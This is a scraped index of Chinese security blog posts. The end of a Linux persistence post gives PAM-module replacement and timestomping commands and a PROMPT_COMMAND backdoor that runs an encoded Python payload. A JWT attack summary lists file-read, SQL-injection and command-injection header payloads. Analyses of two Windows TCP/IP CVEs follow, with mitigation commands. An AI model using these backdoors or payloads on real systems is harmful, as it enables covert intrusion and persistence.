`uname -p` = 'x86_64' ];then LIBPATH=lib64 else LIBPATH=lib fi /bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. ......... /bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so touch -d \"$oldtime\" /lib/security/pam_unix.so cd .. \u0026\u0026 rm -rf Linux-PAM-1.1.1* echo \"Done bro..\" 可以根据需要将下载pam部分修改为上传本地下载好的pam，这样可以避免目标主机无法访问对应链接地址时造成的文件下载失败。 Linux PAM版本地址：http://www.linux-pam.org/library/ 详细情况可参考https://blog.51cto.com/redkey/1343316 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:7","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"5. PROMPT_COMMAND后门 bash提供来一个环境变量PROMPT_COMMAND，这个变量会在执行命令前执行一遍。 export PROMPT_COMMAND=\"lsof -i:1025 \u0026\u003e/dev/null || (python -c \"exec('encoded_payload'.decode('base64'))\" 2\u003e/dev/null \u0026)\" 也可以使用该变量进行提权：https://www.anquanke.com/post/id/155943 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:8","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"7. Rootkit 根据搜索情况来看，一般水平的rootkit很容易将系统环境搞崩，而高质量的Rootkit不太容易找，因此如非迫不得已，不是很建议直接使用这种方法。如果能单独进行定制，是另外一种情况。这里暂时先给出一个收集的rootkit库：https://github.com/d30sa1/RootKits-List-Download ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:9","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"参考文献 https://wiki.bash-hackers.org/howto/redirection_tutorial https://www.gnu.org/software/bash/manual/html_node/Redirections.html https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/ https://www.anquanke.com/post/id/171891#h2-15 https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html https://www.anquanke.com/post/id/155943#h2-9 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:3:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Vuln"],"content":"简述JWT认证，并简单总结其攻击界面","date":"2020-11-19","objectID":"/2020/11/JWT/","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"JWT认证和攻击界面简单总结 ","date":"2020-11-19","objectID":"/2020/11/JWT/:0:0","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"JWT简述 Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 ","date":"2020-11-19","objectID":"/2020/11/JWT/:1:0","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"JWT认证和session认证的区别 1. session认证 http协议是一种无状态的协议，即其对事务处理没有记忆能力，不对请求和响应之间的通信状态进行保存。如果用户向应用提供了用户名和密码来进行用户认证，那么在进行下一次请求时，需要再次进行用户认证。因为使用http协议并不能明确是哪个用户发送的请求。 为了实现应用可以识别出发出请求的用户，需要在server上存储一份用户登录的信息，这份登录信息会在server响应时传递给client，告诉其保存为cookie，以便下次请求时发送给应用。这样，就可以识别出发出请求的用户。以上即为传统的基于session的认证。 Cookie的传递过程 浏览器向URL发送请求 server生成response 在响应头中加入Set-Cookie字段，值为要设置的Cookie 浏览器接受到response 浏览器在响应头中搜索Set-Cookie字段，并将值保存在内存或硬盘中 当下一次向该server发送http请求时，将server设置的Cookie附加在http请求的字段Cookie中 server收到请求，发现头部有Cookie字段，则明确已处理过该用户的请求 过期的Cookie会被删除 基于Cookie—Session的验证过程 用户输入登录信息 server验证信息是否正确，如果正确就为该用户创建一个Session，并把Session存入数据库 server向client返回带有sessionID的Cookie client接收到server返回的响应，发现头部有Set-Cookie字段，将Cookie进行保存 后续client的请求都会附带该Cookie，server将sessionID与数据库中的做匹配，如果一直则处理该请求 用户登出，Session会在client和server都被销毁 Cookie-Session机制的缺陷 跨域问题，Cookie属于同源策略限制的内容之一 Session保存在server，容易遭受DoS攻击 扩展性低，多台server较难实现Session共享 安全性低，attacker可以利用本地Cookie进行欺骗和CSRF攻击 2. JWT认证 基于Token的鉴权机制也是无状态的，但它不徐奥server存储用户的认证信息或会话信息。 JWT组成 JWT由3部分组成：header、payload、signature，每个部分中间使用.进行分隔，其中，header和payload使用Base64URL进行编码，即： base64UrlEncode(header).base64UrlEncode(payload).signature header部分是一个JSON对象，用来描述JWT的元数据： { \"typ\": \"JWT\", // 表示对象是一个 JWT \"alg\": \"HS256\" // 表示使用哪种 Hash 算法来创建签名，这里是 HMAC-SHA256 } payload部分也是一个JSON对象，存储实际需要传递的数据，其内容可以是官方定义的7个字段，也可以是自定义的私有字段： { \"sub\": \"title\", \"iat\": 1605688497, \"exp\": 9999999999, \"name\": \"V4ler1an\" } JWT默认不进行加密，所以该部分不要存放关键信息。 signature是对前2部分的签名，防止数据被篡改。这里需要传入一个key作为加密的私钥： key = \"secret\" data = base64urlEncode(header) + \".\" + base64urlEncode(payload); signature = HMAC-SHA256(key，data); 一个样例JWT如下： JWT认证流程 用户使用账号和密码发出post请求 server使用私钥创建一个JWT，并返回给浏览器 浏览器将该JWT串放在请求头的Authorization中: Authorization: Bearer \u003ctoken\u003e, 发送给server server对JWT进行验证 验证通过后返回相应的资源给浏览器 用户登出，client删除token，server不做处理 JWT缺陷 默认不加密 只验证来源可靠性，并不对数据进行保护，也不会防止未授权访问。只要获取到token，任意用户都可以通过验证。为减少盗用，JWT的有效期应该设置尽可能短 Token过期问题，因为server不保存Session状态，所以无法在使用过程中废止或更改权限。即JWT一旦签发，到期前会始终有效。 JWT攻击界面 爆破私钥key。如果signature的加密私钥key为已知，理论上来说可以通过爆破获得，且已有爆破工具可以直接使用 修改算法， 将非对称加密算法修改为对称加密算法。HS256使用私密密钥对每条消息进行签名和验证，这也是JWT默认使用的算法，RS256使用私钥对消息进行签名，并使用公钥进行验证。可以将算法RS256更改为HS256，后端代码会使用公钥作为私密密钥，然后使用HS256验证签名。即想办法获取到RS256的公钥，然后修改算法为HS256，然后使用RSA公钥对数据签名，后端代码使用RSA公钥+HS256算法签名，从而实现绕过。 修改算法为none，即将header中的alg字段修改为none。这种方式只适合一些低版本的JWT库。当设置为none时表示没有签名算法，后端不会进行签名校验，此时去掉JWT的signature数据，然后直接提交给服务端即可。 修改KID参数。kid是header中的一个可选参数，全称key ID，用于指定加密算法的密钥： { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/home/jwt/.ssh/pem\" } 该参数可以由用户输入。常见的有以下几种攻击方式： 任意文件读取 kid参数用于读取密钥文件，但系统并不知道用户想要读取的是否是密钥文件。所以，如果没有对参数进行过滤，那么攻击折可以读取到系统的任意文件。 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } SQL注入 kid也可以从数据库中提取数据，此时有可能造成SQL攻击，通过构造SQL语句来获取数据或绕过signature的验证。 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"key111111' || union select 'secretkey' -- \" } 命令注入 利用条件苛刻。ruby语言需要使用open函数读取密钥文件，可以命令注入。 \"/path/to/key_file|whoami\" 如果是php语言，则需要使用exec或system函数读取密钥文件，可能性较小。 信息泄露。由于JWT的初衷并不是保证传输数据的机密性，所以payload是直接使用base64url编码的。如果在payload中携带了敏感信息，可以直接进行base64url解码，从而读取到payload中的关键信息。 ","date":"2020-11-19","objectID":"/2020/11/JWT/:1:1","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"简单分析CVE-2020-16898","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"CVE-2020-16898 “Bad Neighbor \" Windows TCP/IP远程代码执行漏洞分析 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows TCP/IP Remote Code Execution Vulnerability 漏洞编号：CVE-2020-16898 漏洞类型：Design Weakness 漏洞影响：Code Execution CVSS评分：9.8 利用难度：Medium 基础权限：不需要 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"2. 组件概述 TCP/IP是Internet上使用的通信协议。 在Windows的早期版本中，TCP/IP是一个单独的可选组件，可以像其他任何协议一样删除或添加。从Windows XP/Server 2003开始，TCP/IP成为操作系统的核心组件，无法删除。 将TCP/IP作为Windows的核心组件是非常有意义的，因为它的功能在Microsoft Windows Server上对网络操作和Active Directory域环境尤为重要。 整个Active Directory架构基于DNS层次结构，依赖于TCP/IP 传输协议 。 Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，以及解释此数据并将其传递给更高级别的组件。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"3. 漏洞利用 该漏洞主要是由于Windows TCP/IP堆栈在处理选项类型为25(0x19，递归DNS服务器选项)且长度字段值为偶数的ICMPv6的路由广播数据包时，处理逻辑存在纰漏，导致存在远程代码执行漏洞。成功利用该漏洞的攻击者可以在目标机器（主机或服务器）上执行任意代码。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"4. 漏洞影响 • Microsoft Windows 10 1709 • Microsoft Windows 10 1803 • Microsoft Windows 10 1809 • Microsoft Windows 10 1903 • Microsoft Windows 10 1909 • Microsoft Windows 10 2004 • Microsoft Windows Server 2019 • Microsoft Windows Server, version 1903 • Microsoft Windows Server, version 1909 • Microsoft Windows Server, version 2004 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"5. 解决方案 微软官方针对该漏洞已发布安全更新补丁，补丁地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"1. 环境搭建 靶机：Windows 10 1809 x64 靶机操作：无需任何操作，可正常与攻击机通信即可 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:2:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"2. 复现过程 通过各种手段获取目标主机的IPv6地址和MAC地址（具体方法可自行探索，较为简单） 攻击机python3运行poc： 靶机crash： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:2:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"1. 基本信息 漏洞文件：tcpip.sys 漏洞函数： Ipv6pUpdateRDNSS()函数 漏洞对象：ICMPv6路由广播中的option结构 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"2. 背景知识 (限于篇幅问题，此处不对用于DNS配置的IPv6路由广播进行详细介绍，更详细资料可参考RFC8106) 1. 基本知识 IPv6 Router Advertisment (RA) options，也称为DNS RA options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server Address(DNS递归路由器地址)列表和DNS Search List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。 IPv6 Neighbor Discovery(ND，IPv6邻居发现)和IPv6 Stateless Address Autoconfiguratioin(SLAAC，IPv6无状态地址自动配置)提供了使用一个或多个IPv6地址，默认路由器以及一些其他参数配置固定节点或移动节点的方法。 当漫游主机每次连接到另一个网络时，无法进行手动配置。 虽然可以进行静态配置，但是在诸如笔记本电脑之类的通用主机上通常不建议这样操作。 例如，如果主机运行直接连接到全局DNS的自己的递归名称服务器，那么本地定义的名称空间对主机来说就不可用了。 访问DNS是几乎所有主机的基本要求，因此IPv6 SLAAC在没有任何DNS配置支持的情况下，不能在任何实际的网络环境中单独作为替代部署模型。 对于IPv4环境中的DNS服务器来说，这些问题都很容易解决。但是对于IPv6的网络环境，这些问题显得比较棘手。因此，RFC8106定义了一种基于DNS RA选项的机制，以允许IPv6主机执行自动DNS配置。 在通过IPv6 SLAAC自动配置IPv6主机地址并且没有DHCPv6基础结构或一些主机没有DHCPv6客户端的网络环境中，可以使用基于RA的DNS配置作为替代。 但是，对于需要分发其他信息的网络，可能仍然会使用DHCPv6。 在这些网络中，可能不需要基于RA的DNS配置。 基于RA的DNS配置允许IPv6主机获取主机连接到的链接的DNS配置（即DNS递归服务器地址和DNSSL）。 此外，主机会从提供链接配置信息的同一RA消息中学习此DNS配置。 2. 名词解释 Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。 RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option【RFC4861】。 DNS Search List (DNSSL)：Pv6主机在执行DNS查询搜索时使用的DNS后缀域名列表，用于搜索简短的不合格域名。 DNSSL Option：一个IPv6 RA选项，用于将DNSSL信息传递到IPv6主机。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"3. 详细分析 1. 基础分析 RFC8106标准化了RDNSS option，其中包含RDNSSes的地址。该信息使用现有ND message(例如RA)作为载体。IPv6主机可以通过RA消息配置一个或多个RDNSS的IPv6地址。 1. 邻居发现扩展 RFC8106中定义的在邻居发现中使用的IPv6 DNS配置算法需要用到2种ND options：RDNSS option和DNSSL option。与该漏洞相关的是RDNSS option，另外一种则与 CVE-2020-16899相关。 2. RDNSS Option Structure RDNSS option总体结构如下： Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bit，RDNSS option type identifier，0x19 0x01 1 Length option长度（包括\"Type\"和\"Length\"字段），以8个八位位组为单位。 0x02 2 Reserved 保留字段 0x04 4 Lifetime RDNSS地址可用于名称解析的最长时间（以秒为单位）（相对于接收包的时间）。默认情况下，该值至少为3 * MaxRtrAdvInterval，其中MaxRtrAdvInterval是RFC4861中定义的最大RA间隔。 0xffffffff表示无穷大， 零值意味着必须不再使用RDNSS地址。 0x08 16 Address of IPv6 Recursive DNS Servers 一个或多个128位IPv6地址。 地址的数量由Length字段确定：Number of addresses = (Length - 1) / 2。 对于Length字段，如果该选项中仅包含一个IPv6地址，则最小值为3。 每增加一个RDNSS地址，长度就会增加2。接收的主机使用该字段来确定选项中IPv6地址的数量。 3. Procedure in IPv6 Hosts 当主机接收到RA消息中的DNS的options时，其处理过程如下： 首先检查Lengh字段的合法性：是否大于等于最小值3，以及是否满足(Length - 1) % 2 == 0； 对于RDNSS option，还会检查Address字段是否为一个单播地址； 如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。 4. Crash分析 首先分析dmp文件，查看crash现场： 并没有发现明显的较为有价值的Call Stack信息，但是发现最终的crash原因的是GS机制的Security Cookie校验失败，也就是说该值被覆盖掉了。那么很有可能是一个溢出。除此之外，只发现了tcpip!Ipv6pHandleRouterAdvertisement+0x1269函数，再往后就直接报gsfailure了。 2. 静态分析 分析使用的文件为Windows 10 1809 x64的tcpip.sys文件，版本为10.0.17763.316。 1. 函数调用链 根据crash现场信息，获取到关键函数tcpip!Ipv6pHandleRouterAdvertisement()，首先确认该函数到漏洞函数的前后调用链。 首先查看其交叉引用关系： 其上层调用函数为Icmpv6ReceiveDatagrams()，跟进，并查看交叉引用关系： 没有再发现显式的函数调用。转而向tcpip!Ipv6pHandleRouterAdvertisement()的下层搜索： 发现漏洞函数调用。至此，函数调用链可以简单概括为： Icmpv6ReceiveDatagrams() -\u003e tcpip!Ipv6pHandleRouterAdvertisement() -\u003e Ipv6pUpdateRDNSS() 2. 漏洞函数分析 经过简单分析可以明确，调用链的顶层函数Icmpv6ReceiveDatagrams()没有发现实质性的与该漏洞相关的处理代码，而在tcpip!Ipv6pHandleRouterAdvertisement() 函数中发现了对漏洞函数Ipv6pUpdateRDNSS()的调用。根据crash分析，最后报了gsfailure，而且关键函数为tcpip!Ipv6pHandleRouterAdvertisement()，在该函数的起始位置确实发现了GS校验： 那么很有可能是在漏洞函数Ipv6pUpdateRDNSS()中发生了溢出，导致了其调用函数tcpip!Ipv6pHandleRouterAdvertisement()的GS校验失败。 进入漏洞函数Ipv6pUpdateRDNSS()： NdisGetDataBuffer()函数声明如下： PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller. The buffer must be greater than or equal in size to the number of bytes specified in BytesNeeded . If this value is non-NULL, and the data requested is not contiguous, NDIS copies the requested data to the area indicated by Storage . UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. 如果NetBuffer参数指向的NET_BUFFER结构中的NET_BUFFER_DATA部分的DataLength字段的值小于BytesNeeded参数的值，那么函数返回NULL。NET_BUFFER的结构如下： typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; 首先获取到RDNSS option结构，然后读取Length字段来计算Address字段有几个Address值。 确认有多少Address之后，进入循环，对每个Address进行处理。这里还有一个判断，如果不是单播地址，直接忽略： 在上面的处理过程中，存在一个问题：假设Length的长度为4，那么计算结束之后，AddressCount的值应该为1。此时，按照正常逻辑，Ipv6pUpdateRDNSS()函数应该增加32字节（4*8）的缓冲区，但是后续在分配缓冲区时只分配了24字节：sizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24，从而导致了缓冲区的溢出。 根据RFC8106的标准，Length字段的值应该满足最小为3的奇数的情况。当提供一个偶数Length值时，Windows TCP/IP堆栈错误地将buffer前进了8个字节。这主要是因为堆栈在内部以16字节为增量进行计数，并且没有使用非RFC兼容长度值的处理代码。这种不匹配导致堆栈将当前选项的最后8个字节解释为第二个选项的开始，最终导致","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"4. 利用思路 1. 利用条件 基本条件 attacker需要获取target的IPv6和MAC地址 触发过程 attacker需要搭配其他内存泄漏或信息泄漏漏洞来实现RCE attacker需要想办法绕过tcpip.sys的GS保护机制 2. 利用过程 attacker直接发送特制的ICMPv6路由广播数据包给target： [ Attacker ] \u003c--------------------\u003e [ Target ] 3. 攻击向量 建立连接后，利用IPv6直接发送攻击数据包即可。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"5. 流量分析 因为该漏洞直接走的IPv6，所以对于一些部署在IP层以上的防火墙方案就无法针对该漏洞进行流量检测，但是具备IP层流量检测的防火墙可以轻松检测恶意流量： 在流量中可以明显看出，第一个Option结构的Address字段错误识别计算了一个Recursive DNS Server的值： 第1个Recursive DNS Server的地址为0018-0027，后续的8个字节不应该再进行识别。选中第2个Recursive DNS Server时情况如下： 第2个Recursive DNS Server的地址为0028-0037。但是该16个字节中的后8个字节很明显为下一个ICMPv6 Option结构的内容： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"四、缓解措施 管理员启动powershell或cmd，输入以下命令检查所有网络IPv6接口的列表以及相应的索引号： netsh int ipv6 sh int 样例输出如下： 确认网络接口的RDNSS功能开启情况： netsh int ipv6 sh int Idx number 执行以下命令关闭RDNSS功能(将Idx number替换为要关闭的网络接口的Idx值)： netsh int ipv6 set int Idx number rabaseddnsconfig=disable 样例输出如下： 此时再次确认接口的RDNSS开启情况，RDNSS功能已被关闭： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"五、参考文献 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 https://tools.ietf.org/html/rfc8106 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/ ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:5:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"简单分析CVE-2020-16899","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析 [toc] ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows TCP/IP Denial of Service Vulnerability 漏洞编号：CVE-2020-16899 漏洞类型：Read out of Bound 漏洞影响：Denial of Service CVSS评分：7.5 利用难度：Medium 基础权限：不需要 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 组件概述 TCP/IP是Internet上使用的通信协议。 在Windows的早期版本中，TCP/IP是一个单独的可选组件，可以像其他任何协议一样删除或添加。从Windows XP/Server 2003开始，TCP/IP成为操作系统的核心组件，无法删除。 将TCP/IP作为Windows的核心组件是非常有意义的，因为它的功能在Microsoft Windows Server上对网络操作和Active Directory域环境尤为重要。 整个Active Directory架构基于DNS层次结构，依赖于TCP/IP 传输协议 。 Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，并将其传递给更高级别的组件。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"3. 漏洞利用 该漏洞主要是由于Windows TCP/IP堆栈在处理选项类型为31(0x1f，DNS搜索表选项)的ICMPv6的路由广播数据包时，处理逻辑存在越界读，导致拒绝服务漏洞。攻击者成功利用该漏洞可使目标主机失去响应，但无法直接进行任意代码执行或权限提取。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"4. 漏洞影响 • Microsoft Windows 10 1709 • Microsoft Windows 10 1803 • Microsoft Windows 10 1809 • Microsoft Windows 10 1903 • Microsoft Windows 10 1909 • Microsoft Windows 10 2004 • Microsoft Windows Server 2019 • Microsoft Windows Server, version 1903 • Microsoft Windows Server, version 1909 • Microsoft Windows Server, version 2004 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"5. 解决方案 微软官方针对该漏洞已发布安全更新补丁，补丁地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 环境搭建 靶机：Windows 10 1809 x64 靶机操作：使用verifier开启tcpip.sys的验证 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:2:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 复现过程 通过各种手段获取目标主机的IPv6地址和MAC地址（具体方法可自行探索，较为简单） 攻击机python3运行poc： 靶机crash： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:2:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"三、漏洞分析 